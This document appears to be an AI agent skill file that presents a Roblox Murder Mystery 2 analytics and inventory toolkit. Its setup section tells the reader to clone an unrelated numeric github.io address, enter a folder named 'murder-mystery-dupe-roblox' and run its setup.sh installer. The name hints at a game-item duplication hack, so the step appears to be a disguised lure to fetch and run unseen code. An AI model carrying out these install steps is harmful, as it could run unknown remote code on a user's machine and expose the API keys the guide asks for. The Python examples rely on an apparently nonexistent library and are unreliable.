---
name: mm2-roblox-analytics-toolkit
description: Analytics and inventory management toolkit for Roblox Murder Mystery 2 gameplay optimization
triggers:
  - "analyze my Murder Mystery 2 inventory"
  - "track MM2 knife skins and stats"
  - "optimize my Roblox MM2 collection"
  - "generate Murder Mystery 2 analytics dashboard"
  - "help me with MM2 inventory tracking"
  - "set up Roblox Murder Mystery analytics"
  - "create MM2 strategy reports"
  - "configure Murder Mystery 2 data visualization"
---

# MM2 Roblox Analytics Toolkit

> Skill by [ara.so](https://ara.so) — Data Skills collection.

This toolkit provides advanced analytics, inventory tracking, and strategic gameplay insights for Roblox's Murder Mystery 2. It combines data visualization, AI-powered pattern recognition, and collection management to optimize player performance and inventory value.

## What It Does

The MM2 Analytics Toolkit offers:

- **Inventory Management**: Track knife skins, gamepasses, and collection completeness
- **Analytics Dashboard**: Real-time statistics with win/loss ratios and performance metrics
- **Strategy Analysis**: Pattern recognition for successful gameplay approaches
- **Data Visualization**: Interactive charts and graphs for gameplay insights
- **AI Integration**: OpenAI and Claude API support for predictive modeling
- **Multi-platform Export**: CSV, JSON, and custom format support

## Installation

### Automated Setup

```bash
# Clone the repository
git clone https://8015238355.github.io
cd murder-mystery-dupe-roblox

# Run automated installer
chmod +x setup.sh
./setup.sh --install
```

### Manual Installation

```bash
# Install Node.js dependencies
npm install

# Install Python dependencies
python3 -m pip install -r requirements.txt

# Verify installation
python3 main.py --version
```

### Environment Configuration

Create a `.env` file in the project root:

```bash
API_OPENAI_KEY=${OPENAI_API_KEY}
API_CLAUDE_KEY=${CLAUDE_API_KEY}
DATA_DIRECTORY=./data/collections
ANALYTICS_INTERVAL=300
ENABLE_LIVE_TRACKING=true
EXPORT_FORMAT=json
LOG_LEVEL=INFO
```

## Key Commands

### CLI Interface

```bash
# Run analytics mode
python3 main.py --mode analytics --profile <profile_name>

# Export statistics
python3 main.py --mode analytics --export output.json --format json

# Track inventory
python3 main.py --mode inventory --scan --verbose

# Generate strategy report
python3 main.py --mode strategy --analyze --output report.pdf

# Start dashboard server
python3 main.py --mode dashboard --port 8080

# Enable debug logging
python3 main.py --mode analytics --log-level DEBUG --verbose
```

### Common Command Patterns

```bash
# Full analytics session with export
python3 main.py --mode analytics \
    --profile mystery_solver_01 \
    --export statistics_2026.json \
    --format json \
    --verbose

# Inventory scan with rarity filter
python3 main.py --mode inventory \
    --scan \
    --filter rarity=legendary,ancient \
    --export-csv inventory.csv

# Strategy analysis with AI predictions
python3 main.py --mode strategy \
    --analyze \
    --ai-engine openai \
    --predict-trends \
    --output strategy_report.json

# Live tracking session
python3 main.py --mode live \
    --profile active_player \
    --refresh-rate 30 \
    --dashboard-port 3000
```

## Configuration

### Profile Configuration (YAML)

Create a profile in `config/profiles/<username>.yaml`:

```yaml
profile:
  username: "MysterySolver2026"
  preferred_role: "sheriff"
  inventory_filter:
    - category: "knife_skins"
      rarity: ["legendary", "ancient"]
    - category: "gamepasses"
      active: true
  analytics_preferences:
    tracking_mode: "comprehensive"
    data_refresh_rate: 30
    export_format: "csv, json"
  strategy_templates:
    - name: "aggressive_sheriff"
      priority: "high_visibility_areas"
    - name: "passive_innocent"
      priority: "distraction_avoidance"
```

### Analytics Configuration (JSON)

`config/analytics.json`:

```json
{
  "tracking": {
    "enabled": true,
    "interval_seconds": 300,
    "metrics": ["win_rate", "kill_accuracy", "survival_time"]
  },
  "visualization": {
    "chart_types": ["line", "bar", "pie"],
    "refresh_rate": 5000,
    "color_scheme": "dark"
  },
  "export": {
    "auto_export": true,
    "formats": ["json", "csv"],
    "directory": "./exports"
  }
}
```

## Code Examples

### Python API Usage

```python
from mm2_analytics import InventoryManager, AnalyticsEngine, StrategyAnalyzer

# Initialize inventory manager
inventory = InventoryManager(profile="player_001")

# Scan and categorize items
items = inventory.scan_collection()
knife_skins = inventory.filter_by_category("knife_skins", rarity="legendary")

print(f"Found {len(knife_skins)} legendary knife skins")

# Calculate collection value
total_value = inventory.calculate_value(items)
print(f"Total inventory value: {total_value}")

# Initialize analytics engine
analytics = AnalyticsEngine(profile="player_001")

# Load gameplay data
analytics.load_session_data("./data/sessions/2026-05.json")

# Calculate statistics
win_rate = analytics.calculate_win_rate(role="sheriff")
avg_survival = analytics.average_survival_time(role="innocent")

print(f"Sheriff win rate: {win_rate:.2%}")
print(f"Average survival time: {avg_survival:.2f}s")

# Generate report
report = analytics.generate_report(
    format="json",
    include_graphs=True,
    output_path="./reports/monthly_stats.json"
)

# Strategy analysis with AI
strategy = StrategyAnalyzer(ai_engine="openai", api_key="${OPENAI_API_KEY}")

# Analyze gameplay patterns
patterns = strategy.identify_patterns(
    session_data="./data/sessions/2026-05.json",
    role="murderer"
)

# Get AI recommendations
recommendations = strategy.get_ai_recommendations(
    patterns=patterns,
    target_improvement="win_rate"
)

for rec in recommendations:
    print(f"- {rec['strategy']}: {rec['description']}")
```

### Inventory Tracking Script

```python
#!/usr/bin/env python3
import os
from mm2_analytics import InventoryManager, DataExporter

def track_inventory(profile_name):
    """Track and export inventory data"""
    
    # Initialize manager
    manager = InventoryManager(
        profile=profile_name,
        data_dir=os.getenv("DATA_DIRECTORY", "./data")
    )
    
    # Perform inventory scan
    print(f"Scanning inventory for {profile_name}...")
    items = manager.scan_collection()
    
    # Filter by categories
    knives = manager.filter_by_category("knife_skins")
    gamepasses = manager.filter_by_category("gamepasses")
    
    # Calculate statistics
    stats = {
        "total_items": len(items),
        "knife_skins": len(knives),
        "gamepasses": len(gamepasses),
        "total_value": manager.calculate_value(items),
        "rarity_breakdown": manager.get_rarity_distribution(knives)
    }
    
    # Export data
    exporter = DataExporter(format="json")
    exporter.export(
        data=stats,
        output_path=f"./exports/{profile_name}_inventory.json"
    )
    
    # Print summary
    print(f"\nInventory Summary:")
    print(f"  Total Items: {stats['total_items']}")
    print(f"  Knife Skins: {stats['knife_skins']}")
    print(f"  Gamepasses: {stats['gamepasses']}")
    print(f"  Estimated Value: {stats['total_value']}")
    
    return stats

if __name__ == "__main__":
    import sys
    profile = sys.argv[1] if len(sys.argv) > 1 else "default_profile"
    track_inventory(profile)
```

### Analytics Dashboard (Python + Web)

```python
from mm2_analytics import DashboardServer, AnalyticsEngine
import os

# Initialize analytics engine
analytics = AnalyticsEngine(
    profile="player_dashboard",
    api_key_openai=os.getenv("API_OPENAI_KEY"),
    api_key_claude=os.getenv("API_CLAUDE_KEY")
)

# Create dashboard server
dashboard = DashboardServer(
    analytics_engine=analytics,
    port=int(os.getenv("DASHBOARD_PORT", 8080)),
    refresh_interval=30
)

# Configure dashboard modules
dashboard.add_module("inventory_overview", {
    "chart_type": "bar",
    "data_source": "inventory.knife_skins",
    "group_by": "rarity"
})

dashboard.add_module("win_rate_trends", {
    "chart_type": "line",
    "data_source": "analytics.win_rate",
    "timeframe": "30d"
})

dashboard.add_module("strategy_insights", {
    "chart_type": "radar",
    "data_source": "strategy.effectiveness",
    "ai_enhanced": True
})

# Start server
print(f"Starting dashboard on port {dashboard.port}...")
dashboard.start()
```

### Strategy Analysis with AI

```python
from mm2_analytics import StrategyAnalyzer
import os
import json

# Initialize strategy analyzer
analyzer = StrategyAnalyzer(
    ai_engine="claude",
    api_key=os.getenv("API_CLAUDE_KEY")
)

# Load session data
with open("./data/sessions/recent_games.json", "r") as f:
    sessions = json.load(f)

# Analyze patterns for each role
roles = ["murderer", "sheriff", "innocent"]
insights = {}

for role in roles:
    # Filter sessions by role
    role_sessions = [s for s in sessions if s["role"] == role]
    
    # Identify successful patterns
    patterns = analyzer.identify_patterns(
        sessions=role_sessions,
        success_threshold=0.7
    )
    
    # Get AI-generated recommendations
    recommendations = analyzer.get_ai_recommendations(
        patterns=patterns,
        context={
            "player_skill_level": "intermediate",
            "playstyle": "balanced",
            "primary_goal": "improve_win_rate"
        }
    )
    
    insights[role] = {
        "patterns": patterns,
        "recommendations": recommendations,
        "win_rate": analyzer.calculate_win_rate(role_sessions)
    }

# Export insights
with open("./reports/strategy_insights.json", "w") as f:
    json.dump(insights, f, indent=2)

print("Strategy analysis complete!")
for role, data in insights.items():
    print(f"\n{role.upper()}:")
    print(f"  Win Rate: {data['win_rate']:.2%}")
    print(f"  Patterns Found: {len(data['patterns'])}")
    print(f"  Recommendations: {len(data['recommendations'])}")
```

## Common Patterns

### Pattern 1: Automated Inventory Tracking

```python
import schedule
import time
from mm2_analytics import InventoryManager, NotificationService

def scheduled_inventory_check():
    """Run periodic inventory scans"""
    manager = InventoryManager(profile="auto_tracker")
    items = manager.scan_collection()
    
    # Check for new items
    new_items = manager.get_new_items_since_last_scan()
    
    if new_items:
        # Send notification
        notifier = NotificationService()
        notifier.send(
            message=f"New items detected: {len(new_items)}",
            items=new_items
        )
    
    # Export updated inventory
    manager.export_snapshot(format="json")

# Schedule every 6 hours
schedule.every(6).hours.do(scheduled_inventory_check)

while True:
    schedule.run_pending()
    time.sleep(60)
```

### Pattern 2: Multi-Session Analytics

```python
from mm2_analytics import AnalyticsEngine, DataAggregator
from datetime import datetime, timedelta

# Initialize analytics
analytics = AnalyticsEngine(profile="multi_session")

# Load multiple sessions
end_date = datetime.now()
start_date = end_date - timedelta(days=30)

sessions = analytics.load_sessions(
    start_date=start_date,
    end_date=end_date
)

# Aggregate statistics
aggregator = DataAggregator()
stats = aggregator.aggregate(sessions, group_by="day")

# Calculate trends
trends = aggregator.calculate_trends(stats, metric="win_rate")

# Visualize
from mm2_analytics.visualization import TrendChart

chart = TrendChart(
    data=trends,
    title="30-Day Win Rate Trend",
    x_label="Date",
    y_label="Win Rate (%)"
)
chart.save("./charts/win_rate_trend.png")
```

### Pattern 3: Collection Completeness Analysis

```python
from mm2_analytics import InventoryManager, CollectionDatabase

# Load collection database (all possible items)
db = CollectionDatabase()
all_items = db.get_all_items(category="knife_skins")

# Get user inventory
manager = InventoryManager(profile="collector_001")
user_items = manager.scan_collection()

# Calculate completeness
missing_items = db.find_missing_items(
    all_items=all_items,
    user_items=user_items
)

# Prioritize by rarity and value
prioritized = sorted(
    missing_items,
    key=lambda x: (x["rarity_score"], x["market_value"]),
    reverse=True
)

# Generate acquisition plan
print("Top 10 items to acquire:")
for i, item in enumerate(prioritized[:10], 1):
    print(f"{i}. {item['name']} ({item['rarity']}) - "
          f"Est. Value: {item['market_value']}")
```

## Troubleshooting

### Common Issues

**Issue: Import errors after installation**

```bash
# Ensure all dependencies are installed
pip install -r requirements.txt --upgrade

# Verify Python path
export PYTHONPATH="${PYTHONPATH}:$(pwd)"
```

**Issue: API connection failures**

```python
# Test API connectivity
from mm2_analytics import APITester

tester = APITester()
tester.test_openai_connection(api_key=os.getenv("API_OPENAI_KEY"))
tester.test_claude_connection(api_key=os.getenv("API_CLAUDE_KEY"))
```

**Issue: Data export failures**

```bash
# Check directory permissions
chmod -R 755 ./exports

# Verify export format
python3 main.py --mode inventory --export test.json --format json --verbose
```

**Issue: Dashboard not loading**

```python
# Check port availability
import socket

def check_port(port):
    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    result = sock.connect_ex(('localhost', port))
    sock.close()
    return result == 0

port = 8080
if check_port(port):
    print(f"Port {port} is already in use")
else:
    print(f"Port {port} is available")
```

**Issue: Session data not loading**

```python
# Validate session data format
import json

def validate_session_data(filepath):
    try:
        with open(filepath, 'r') as f:
            data = json.load(f)
        
        required_fields = ["session_id", "role", "outcome", "timestamp"]
        for field in required_fields:
            if field not in data:
                print(f"Missing required field: {field}")
                return False
        
        print("Session data is valid")
        return True
    except Exception as e:
        print(f"Validation error: {e}")
        return False

validate_session_data("./data/sessions/session_001.json")
```

## Advanced Usage

### Custom Analytics Metrics

```python
from mm2_analytics import MetricCalculator

class CustomMetrics(MetricCalculator):
    def calculate_aggression_score(self, sessions):
        """Calculate player aggression based on actions"""
        total_actions = 0
        aggressive_actions = 0
        
        for session in sessions:
            for action in session.get("actions", []):
                total_actions += 1
                if action["type"] in ["chase", "attack", "shoot"]:
                    aggressive_actions += 1
        
        return aggressive_actions / total_actions if total_actions > 0 else 0
    
    def calculate_stealth_score(self, sessions):
        """Calculate stealth effectiveness"""
        stealth_time = sum(s.get("undetected_time", 0) for s in sessions)
        total_time = sum(s.get("total_time", 0) for s in sessions)
        
        return stealth_time / total_time if total_time > 0 else 0

# Use custom metrics
metrics = CustomMetrics()
aggression = metrics.calculate_aggression_score(sessions)
stealth = metrics.calculate_stealth_score(sessions)

print(f"Aggression Score: {aggression:.2f}")
print(f"Stealth Score: {stealth:.2f}")
```

### Batch Processing

```bash
# Process multiple profiles
for profile in profiles/*.yaml; do
    python3 main.py --mode analytics \
        --profile $(basename $profile .yaml) \
        --export "reports/$(basename $profile .yaml)_report.json"
done
```

This toolkit enables comprehensive Murder Mystery 2 analytics through data-driven insights, inventory optimization, and AI-powered strategy recommendations.
